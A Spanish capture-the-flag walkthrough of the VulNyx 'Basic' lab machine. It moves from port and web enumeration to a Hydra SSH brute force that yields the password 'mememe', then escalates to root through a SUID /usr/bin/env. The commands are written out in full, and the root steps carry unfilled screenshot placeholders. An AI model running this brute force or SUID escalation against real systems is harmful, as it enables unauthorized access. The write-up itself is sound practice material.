# VulNyx Basic

## 📌 Información

| Campo             | Valor                                               |
| ----------------- | --------------------------------------------------- |
| Plataforma        | VulNyx                                              |
| Máquina           | Basic                                               |
| Dificultad        | Easy                                                |
| Sistema Operativo | Linux                                               |
| Categoría         | Enumeration / Initial Access / Privilege Escalation |

---

# 🎯 Objetivo

Obtener acceso inicial a la máquina **VulNyx Basic** y conseguir privilegios de **root**.

---

# 🛠 Herramientas

* Nmap
* Gobuster
* Hydra
* SSH
* GTFOBins

---

# 🔍 Enumeración

## 1. Descubrimiento del objetivo

Primero identificamos la dirección IP asignada a la máquina VulNyx Basic.
para saber exactamente la ip de la maquina utilizamos la herramienta
barrio de condor777
<img width="1920" height="921" alt="Screenshot_2026-08-19_23_05_16" src="https://github.com/user-attachments/assets/c56a96a7-735a-4cbb-80e5-306d702ed26d" />

<img width="1920" height="921" alt="Screenshot_2026-08-20_01_15_06" src="https://github.com/user-attachments/assets/dd81282f-15cd-46cc-93b8-390f1f71d745" />
identificamos que nuestra ip es la 10.0.2.11

Posteriormente comprobamos la conectividad con la máquina:

<img width="1920" height="921" alt="Screenshot_2026-08-20_01_16_50" src="https://github.com/user-attachments/assets/a51adf43-d0ec-4064-91e0-9026fa53cb5e" />



## 2. Face de escaneo con la herramienta Nmap

Comenzamos realizando un escaneo completo de puertos:

nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv ip

<img width="1920" height="921" alt="Screenshot_2026-08-20_01_20_47" src="https://github.com/user-attachments/assets/24743eb1-6d94-47e5-a696-c4d96a617b9d" />

### 🔎 Resultados

El escaneo permitió identificar los siguientes servicios:

<img width="1920" height="921" alt="Screenshot_2026-08-20_01_21_23" src="https://github.com/user-attachments/assets/fff64b9a-3e67-49bf-8a5c-79fb9ee66887" />

* **22/tcp** → SSH
* **80/tcp** → HTTP / Apache
* **631/tcp** → ipp CUPS 2.3

---

# 🌐 Enumeración Web

Al encontrar el puerto 80 abierto, accedemos al servidor web:

```text
http://10.0.2.11
```
<img width="1920" height="921" alt="Screenshot_2026-08-20_01_22_08" src="https://github.com/user-attachments/assets/80a7c6d6-042d-4d65-9a01-b84fd2d84842" />

El servidor muestra una página por defecto de Apache.

### Gobuster

Realizamos enumeración de directorios:

```bash
gobuster dir -u http:// -w /usr/share/wordlists/dirb/common.txt -x php,txt,js,py,html
```
<img width="1920" height="921" alt="Screenshot_2026-08-20_01_31_24" src="https://github.com/user-attachments/assets/660a6508-4d35-443a-8216-dc25d7c7c896" />

### 🔎 Resultados

Durante la enumeración no se encontro nada interesante

<img width="1920" height="921" alt="Screenshot_2026-08-20_01_31_42" src="https://github.com/user-attachments/assets/c1f05263-7499-41bc-916b-a2e5c05aa20d" />

accedemos al servidor wed nuevamente pero ahora con el puerto 631
```text
http://10.0.2.11:631
```
<img width="1920" height="921" alt="Screenshot_2026-08-20_01_28_21" src="https://github.com/user-attachments/assets/b3f6adb0-a58c-413e-9572-a03be63b9df9" />

encontramos otra pagina web CUPS 2.3.3op2
nos movemos entre los apartados de la wed hasta llegar a printers
<img width="1920" height="921" alt="Screenshot_2026-08-20_01_29_10" src="https://github.com/user-attachments/assets/06a5b73d-0b45-4251-85ee-4dad59f84a96" />

# 🔐 Descubrimiento de Credenciales

Durante la enumeración se consigue identificar un usuario válido:

```text
Usuario: dimitri
```
# 💣 Acceso Inicial

El puerto 22 se encuentra abierto y ejecuta SSH.

se realiza un ataque de fuerza bruta controlado contra el servicio SSH 
utilizando la herramienta Hydra y el nombre de usuario dimitri.

```bash
hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.11 -t 4 -V
```
<img width="1920" height="921" alt="Screenshot_2026-08-20_01_33_40" src="https://github.com/user-attachments/assets/97c0e295-f24f-4cea-a46e-289442f6e65c" />

Se obtienen las siguientes credenciales:

```text
Username: dimitri
Password: mememe
```
<img width="1920" height="921" alt="Screenshot_2026-08-20_01_45_25" src="https://github.com/user-attachments/assets/52454e29-bfac-4d8c-9c74-0cea711b59dc" />

Con las credenciales obtenidas se establece una conexión SSH:

```bash
ssh dimitri@10.0.2.11
```
<img width="1920" height="921" alt="Screenshot_2026-08-20_01_45_51" src="https://github.com/user-attachments/assets/05918c31-7301-43d5-a265-b8dc18805e7c" />

Una vez dentro, comprobamos nuestra identidad:

```bash
whoami
```
Resultado:
```text
dimitri
```
<img width="1920" height="921" alt="Screenshot_2026-08-20_02_41_42" src="https://github.com/user-attachments/assets/6df8bce2-1534-436f-b0bd-1da2809ec638" />

También comprobamos los grupos y privilegios:

```bash
id
```
<img width="1920" height="921" alt="Screenshot_2026-08-20_02_46_56" src="https://github.com/user-attachments/assets/2c123176-3b1b-4d40-b7ef-ff12bea77b9f" />

# 🔑 Enumeración para Privilege Escalation

Una vez obtenido el acceso inicial, comenzamos a investigar posibles métodos para escalar privilegios.
con el comando ls encontramos un archio llamado user.txt 

<img width="1920" height="921" alt="Screenshot_2026-08-20_01_46_16" src="https://github.com/user-attachments/assets/7ba9de5f-362b-417d-8bea-fae9f9c3ea71" />

con el comando less miramos que hay dentro del archivo user.txt

<img width="1920" height="921" alt="Screenshot_2026-08-20_02_58_26" src="https://github.com/user-attachments/assets/267fda8f-05cb-48d3-ba44-b090650087b5" />

encontramos el primer flag
```text
f17d2f67c468d15600d8fc0b2ebc1d8c
```


realizamos una búsqueda de archivos con permisos **SUID**:

```bash
find / -perm -4000 -type f 2>/dev/null
```
<img width="1920" height="921" alt="Screenshot_2026-08-20_01_46_58" src="https://github.com/user-attachments/assets/62d35508-49c2-4bda-bd5b-b7492c8ec311" />

### 🔎 Hallazgo

Durante la enumeración se identifica el siguiente binario:

```text
/usr/bin/env
```

El binario `env` posee permisos SUID, lo que permite ejecutarlo con los privilegios del propietario del archivo.

---

# 🚀 Explotación del SUID

Se consulta la documentación de **GTFOBins** para comprobar si `env` puede utilizarse para obtener una shell privilegiada.

La técnica permite ejecutar una shell utilizando los privilegios elevados del binario.

Se ejecuta:

```bash
/usr/bin/env /bin/sh
```

Posteriormente verificamos los privilegios:

```bash
whoami
```

Resultado:

```text
root
```

También podemos comprobar:

```bash
id
```

El resultado confirma que hemos obtenido privilegios de administrador.

### 📸 Privilege Escalation

> Agregar aquí captura de la explotación de `env` y del resultado de `whoami`.

---

# 👑 Root Access

Finalmente verificamos el acceso como root:

```bash
whoami
```

Resultado:

```text
root
```

También podemos comprobar el acceso al directorio `/root`:

```bash
cd /root
ls -la
```

La máquina ha sido comprometida exitosamente y se han obtenido privilegios de root.

### 📸 Root

> Agregar aquí captura final demostrando acceso como root.

---

# 🧠 Lecciones Aprendidas

* La importancia de realizar un escaneo completo de puertos.
* La utilidad de `-sC` y `-sV` para identificar servicios y versiones.
* La importancia de enumerar aplicaciones web incluso cuando muestran una página por defecto.
* La utilidad de Gobuster para descubrir directorios y recursos ocultos.
* Cómo identificar mecanismos de autenticación HTTP.
* La importancia de investigar los usuarios y credenciales descubiertos.
* Cómo utilizar Hydra para comprobar credenciales en servicios autorizados.
* La diferencia entre **Initial Access** y **Privilege Escalation**.
* La importancia de buscar archivos SUID después de obtener acceso.
* Cómo un binario aparentemente legítimo como `env` puede representar un riesgo cuando posee permisos SUID.
* La utilidad de GTFOBins para investigar posibles técnicas de abuso de binarios Unix.

---

# 🏁 Conclusión

VulNyx Basic permitió practicar un flujo completo de pentesting sobre un sistema Linux vulnerable.

El proceso comenzó con la enumeración de puertos y servicios mediante Nmap, seguido de la enumeración del servidor web con Gobuster.

Posteriormente se obtuvo acceso inicial mediante SSH utilizando las credenciales descubiertas y se realizó una segunda fase de enumeración desde el sistema comprometido.

Finalmente, se identificó el binario `/usr/bin/env` con permisos SUID y se utilizó para realizar una escalada de privilegios hasta obtener acceso como **root**.

La máquina permitió reforzar conceptos fundamentales de:

**Enumeration → Initial Access → Privilege Escalation → Root**

---

# ⚠️ Disclaimer

Esta máquina fue desarrollada intencionalmente como un entorno vulnerable para practicar técnicas de ciberseguridad.

Todas las técnicas utilizadas en este laboratorio deben realizarse únicamente contra sistemas propios, entornos de laboratorio o sistemas para los cuales se tenga autorización explícita.

